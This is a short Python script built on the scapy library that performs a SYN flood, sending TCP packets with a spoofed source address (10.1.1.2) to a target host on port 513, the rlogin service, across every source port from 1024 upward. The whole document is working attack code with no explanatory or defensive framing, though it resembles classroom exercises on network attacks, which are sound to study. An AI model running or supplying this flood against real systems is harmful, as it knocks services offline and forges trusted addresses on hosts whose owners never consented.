from scapy.all import IP, TCP, send

def syn_flood(src, tgt):
    for sport in range(1024, 65535):
        ip_layer = IP(src=src, dst=tgt)
        tcp_layer = TCP(sport=sport, dport=513)
        pkt = ip_layer / tcp_layer
        send(pkt, verbose=False)

if __name__ == "__main__":
    src = "10.1.1.2"
    tgt = "192.168.1.3"
    syn_flood(src, tgt)
